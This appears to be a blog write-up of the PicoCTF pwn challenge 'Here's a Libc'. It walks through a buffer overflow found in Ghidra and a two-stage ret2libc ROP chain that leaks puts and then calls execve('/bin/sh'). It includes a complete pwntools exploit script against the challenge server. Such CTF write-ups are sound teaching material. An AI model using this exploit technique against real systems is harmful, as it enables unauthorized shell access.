# PicoCTF - Here’s a Libc [Pwn]

[Massimiliano Pellizzer](https://medium.com/u/3e4cf530f0ac) on 2021-07-08

## Introduction

“Here’s a Libc” is a pwn challenge of [PicoCTF](https://picoctf.org/).

The challenge provides a binary file (the program to exploit), and the Libc used by the program remotely.

## Reverse Engineering

The first thing I did was to get some general information about the binary file and the security measures employed by the program itself.

![](https://cdn-images-1.medium.com/fit/c/800/293/1*-p8ek4D1voi2IqOTouyziA.png)General information about the program and its security measures

It is possible to notice that the file is a 64bit ELF file, and the only interesting security measure employed is the [no-execute bit](https://en.wikipedia.org/wiki/NX_bit). Because of this security measure (and because the name of the challenge), I imagined that, in order to solve the challenge, it was necessary to jump into the Libc.

Unfortunately I was not able to execute the binary locally, nor analyze it by using [GDB](https://www.gnu.org/software/gdb/). (If there is anybody who knows why or how to solve the problem, I would appreciate if she/he could drop me a line. Working together with other CTF players would really help me in extending my knowledge on the topic).

![](https://cdn-images-1.medium.com/fit/c/800/156/1*Gyh9nKj7O8QuL0aOPw-tyg.png)Segmentation fault when executing locally

The only option remaining was to perform some static analysis by using [Ghidra](https://ghidra-sre.org/). After some variable renaming and retyping I was able to understand that the program implemented an echo server. From an high level perspective, it receives a string from the user and it prints it out by making all the letters in even positions upper case and the letters in odd positions lower case.

![](https://cdn-images-1.medium.com/fit/c/417/124/1*bP6mypbS5wXs9aYjEqAaEQ.png)Echo server implementation

By looking at the code in Ghidra it was very easy to spot a buffer overflow of unlimited length.

![](https://cdn-images-1.medium.com/fit/c/422/341/1*5aZqMSGI3q__oFMQZzaesw.png)Buffer Overflow

It is possible to see that the program takes as input a string of unlimited length and stores it inside a buffer of 112 bytes.

## Exploitation: General Idea

By exploiting the buffer overflow spotted previously it is possible to obtain full control of the instruction pointer, but there something missing: the address of Libc where to jump to. However, there is a _puts_ in the code that prints what is stored at the address passed as argument.

From the considerations done above I came up with the following idea:

1. Create a [ROP chain](https://en.wikipedia.org/wiki/Return-oriented_programming), by using local gadgets, in order to pass to the _puts_ function an address of the [[GOT table]] (this is possible because the binary is not PIE, therefore the addresses of the GOT table entries are static and visible from Ghidra)
2. Jump to the _puts_ function (actually, it is safer to jump to the _puts_ in the Libc by using the [[PLT table]]
3. Print the (dynamic) address of the Libc’s _puts_ function
4. Force the program to return to the first instruction of the _main_ function, in order to execute the program once again and therefore in order to exploit the buffer overflow one more time
5. Create a new ROP chain in order to jump to the _execve_ function, in the Libc, therefore forcing the program to spawn a new program: _/bin/sh_

## Exploitation: Implementation

In order to implement the idea explained before it was necessary to make few steps.

The first thing to do was to find the right padding. By not having the possibility of executing the file locally I was forced to do some trial and error remotely by sending strings of different length until the program crashed.

Once I found the the right padding I retrieved some useful addresses in the binary:

- The address of the gadget _pop rdi, ret;_
- The address of the entry in the GOT table corresponding to the function _puts_
- The address of the entry in the PLT table corresponding to the function _puts_
- The address of the of the first instruction of the _main_ function

In particular, in order to retrieve the address of the gadget I used [ROPgadget](https://github.com/JonathanSalwan/ROPgadget), while, for the other addresses I used Python. By having all these addresses I was able to construct the first ROP chain, and therefore, to make the program print the address of the _puts_ function in the Libc.

Then, by having the address of the Libc’_s puts_ function, I was able to calculate the base address of the Libc:

Libc_base = Leaked_address - Static_offset

where the static offset is the address of the _puts_ function in the Libc, assuming the Libc base address is 0x0000000000000000 (I found it using Python on the copy of the Libc used remotely, provided by the challenge).

Then, by having the Libc base address, I was able to find the addresses of:

- the _execve_ function in the Libc
- the string “_/bin/sh\x00”_ inside the Libc
- a null pointer inside the Libc

All these addresses where found using Python.

Finally, in order to create the second ROP chain, I missed two gadgets

- _pop rsi, ret;_ (I found it locally)
- _pop rdx, ret;_ (I found it in the Libc)

All these gadgets where found using ROPgadget.

The final code implementing the exploit is the following one:

```python
#!/bin/python3

from pwn import *

HOST = 'mercury.picoctf.net'
PORT = <insert_your_port>
EXE  = './vuln'

if args.EXPLOIT:
    r = remote(HOST, PORT)
    libc = ELF('./libc.so.6')

exe = ELF(EXE)

pop_rdi = 0x400913
pop_rsi = 0x023e8a
pop_rdx = 0x001b96
offset  = libc.symbols['puts']

r.recvuntil(b'sErVeR!\n')

payload  = b'A'*136
payload += p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.symbols['main'])

r.sendline(payload)

r.recvline()

leak = r.recv(6)+b'\x00\x00'
leak = u64(leak)

libc.address = leak - offset
binsh        = next(libc.search(b'/bin/sh\x00'))
system       = libc.symbols['system']
nullptr      = next(libc.search(b'\x00'*8))
execve       = libc.symbols['execve']

payload  = b'A'*136
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(libc.address + pop_rsi)
payload += p64(nullptr)
payload += p64(libc.address + pop_rdx)
payload += p64(nullptr)
payload += p64(execve)

r.sendline(payload)

r.interactive()
```

Once the script executed, I was able to obtain a shell attached to the remote server and therefore I was able to extract the flag:

![](https://cdn-images-1.medium.com/fit/c/800/518/1*GlBaWZnVc2eD3TV4IOq-sg.png)Flag

Pwned!